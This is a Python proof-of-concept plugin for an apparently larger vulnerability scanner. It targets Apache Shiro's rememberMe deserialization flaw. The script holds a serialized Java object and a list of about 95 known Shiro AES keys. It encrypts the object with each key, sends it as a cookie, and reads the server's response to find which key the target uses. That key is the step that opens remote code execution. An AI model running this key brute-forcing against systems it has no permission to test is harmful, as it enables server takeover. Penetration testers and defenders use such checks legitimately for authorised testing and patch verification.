#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'


import uuid
from Cryptodome.Cipher import AES
from lib.utils.cipher import base64encode
from lib.utils.cipher import base64decode
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'shiro rce'
        self.keyword = ['shiro', 'rce']
        self.info = 'shiro rce'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    def get_aes_cipher_cookie(self, text, key):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64decode(key), mode, iv)
        file_body = pad(base64decode(text))
        base64_ciphertext = base64encode(iv + encryptor.encrypt(file_body))
        return "rememberMe=" + str(base64_ciphertext)

    async def prove(self):
        await self.get_url()
        if self.base_url:
            evil_obj_b64 = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="
            keylist = [
                'kPH+bIxk5D2deZiIxcaaaA==',
                'wGiHplamyXlVB11UXWol8g==',
                '2AvVhdsgUs0FSA3SDFAdag==',
                '4AvVhmFLUs0KTA3Kprsdag==',
                '3AvVhmFLUs0KTA3Kprsdag==',
                'Z3VucwAAAAAAAAAAAAAAAA==',
                'U3ByaW5nQmxhZGUAAAAAAA==',
                'fCq+/xW488hMTCD+cmJ3aQ==',
                '1QWLxg+NYmxraMoxAXu/Iw==',
                'ZUdsaGJuSmxibVI2ZHc9PQ==',
                'L7RioUULEFhRyxM7a2R/Yg==',
                '6ZmI6I2j5Y+R5aSn5ZOlAA==',
                'r0e3c16IdVkouZgk1TKVMg==',
                '5aaC5qKm5oqA5pyvAAAAAA==',
                'bWluZS1hc3NldC1rZXk6QQ==',
                'a2VlcE9uR29pbmdBbmRGaQ==',
                'WcfHGU25gNnTxTlmJMeSpw==',
                'MTIzNDU2Nzg5MGFiY2RlZg==',
                '5AvVhmFLUs0KTA3Kprsdag==',
                '6ZmI6I2j3Y+R1aSn5BOlAA==',
                'SkZpbmFsQmxhZGUAAAAAAA==',
                '2cVtiE83c4lIrELJwKGJUw==',
                'fsHspZw/92PrS3XrPW+vxw==',
                'XTx6CKLo/SdSgub+OPHSrw==',
                'sHdIjUN6tzhl8xZMG3ULCQ==',
                'O4pdf+7e+mZe8NyxMTPJmQ==',
                'f/SY5TIve5WWzT4aQlABJA==',
                'HWrBltGvEZc14h9VpMvZWw==',
                'rPNqM6uKFCyaL10AK51UkQ==',
                'Y1JxNSPXVwMkyvES/kJGeQ==',
                'lT2UvDUmQwewm6mMoiw4Ig==',
                'MPdCMZ9urzEA50JDlDYYDg==',
                'xVmmoltfpb8tTceuT5R7Bw==',
                'c+3hFGPjbgzGdrC+MHgoRQ==',
                'ClLk69oNcA3m+s0jIMIkpg==',
                'Bf7MfkNR0axGGptozrebag==',
                '1tC/xrDYs8ey+sa3emtiYw==',
                'ZmFsYWRvLnh5ei5zaGlybw==',
                'cGhyYWNrY3RmREUhfiMkZA==',
                'IduElDUpDDXE677ZkhhKnQ==',
                'yeAAo1E8BOeAYfBlm4NG9Q==',
                'cGljYXMAAAAAAAAAAAAAAA==',
                '2itfW92XazYRi5ltW0M2yA==',
                'XgGkgqGqYrix9lI6vxcrRw==',
                '25BsmdYwjnfcWmnhAciDDg==',
                'ertVhmFLUs0KTA3Kprsdag==',
                '5AvVhmFLUS0ATA4Kprsdag==',
                's0KTA3mFLUprK4AvVhsdag==',
                'hBlzKg78ajaZuTE0VLzDDg==',
                '9FvVhtFLUs0KnA3Kprsdyg==',
                'd2ViUmVtZW1iZXJNZUtleQ==',
                'yNeUgSzL/CfiWw1GALg6Ag==',
                'NGk/3cQ6F5/UNPRh8LpMIg==',
                '4BvVhmFLUs0KTA3Kprsdag==',
                'MzVeSkYyWTI2OFVLZjRzZg==',
                '0AvVhmFLUs0KTA3Kprsdag==',
                '1AvVhdsgUs0FSA3SDFAdag==',
                '3JvYhmBLUs0ETA5Kprsdag==',
                '6AvVhmFLUs0KTA3Kprsdag==',
                '6NfXkC7YVCV5DASIrEm1Rg==',
                'cmVtZW1iZXJNZQAAAAAAAA==',
                '7AvVhmFLUs0KTA3Kprsdag==',
                '8AvVhmFLUs0KTA3Kprsdag==',
                '8BvVhmFLUs0KTA3Kprsdag==',
                '9AvVhmFLUs0KTA3Kprsdag==',
                'OUHYQzxQ/W9e/UjiAGu6rg==',
                'a3dvbmcAAAAAAAAAAAAAAA==',
                'aU1pcmFjbGVpTWlyYWNsZQ==',
                'bWljcm9zAAAAAAAAAAAAAA==',
                'bXRvbnMAAAAAAAAAAAAAAA==',
                'OY//C4rhfwNxCQAQCrQQ1Q==',
                '5J7bIJIV0LQSN3c9LPitBQ==',
                'bya2HkYo57u6fWh5theAWw==',
                'WuB+y2gcHRnY2Lg9+Aqmqg==',
                '3qDVdLawoIr1xFd6ietnwg==',
                'YI1+nBV//m7ELrIyDHm6DQ==',
                '6Zm+6I2j5Y+R5aS+5ZOlAA==',
                '2A2V+RFLUs+eTA3Kpr+dag==',
                'empodDEyMwAAAAAAAAAAAA==',
                'A7UzJgh1+EWj5oBFi+mSgw==',
                'c2hpcm9fYmF0aXMzMgAAAA==',
                'i45FVt72K2kLgvFrJtoZRw==',
                'U3BAbW5nQmxhZGUAAAAAAA==',
                'ZnJlc2h6Y24xMjM0NTY3OA==',
                'Jt3C93kMR9D5e8QzwfsiMw==',
                'MTIzNDU2NzgxMjM0NTY3OA==',
                'vXP33AonIp9bFwGl7aT7rA==',
                'V2hhdCBUaGUgSGVsbAAAAA==',
                'Q01TX0JGTFlLRVlfMjAxOQ==',
                'ZAvph3dsQs0FSL3SDFAdag==',
                'Is9zJ3pzNh2cgTHB4ua3+Q==',
                'NsZXjXVklWPZwOfkvk6kUA==',
                'GAevYnznvgNCURavBhCr1w==',
                '66v1O8keKNV3TTcGPK1wzg==',
                'SDKOLKn2J1j/2BHjeZwAoQ==',
            ]
            async with ClientSession() as session:
                for url in self.url_normpath(self.url, './'):
                    for i in range(0, len(keylist)):
                        cookie = self.get_aes_cipher_cookie(evil_obj_b64, keylist[i])
                        header = {"Cookie": cookie}
                        async with session.get(url=url, headers=header, allow_redirects=False) as res:
                            if res != None and 'rememberme=deleteme' not in res.headers.get("Set-Cookie", "").lower():
                                cookie = self.get_aes_cipher_cookie(evil_obj_b64, 'Th15IsN0tExi5TK3yaaaaa==' )
                                header = {"Cookie": cookie}
                                async with session.get(url=url, headers=header, allow_redirects=False) as res:
                                    if res != None and 'rememberme=deleteme' in res.headers.get("Set-Cookie", "").lower():
                                        self.flag = 1
                                        self.res.append({"info": url, "key":  keylist[i]})
                                        return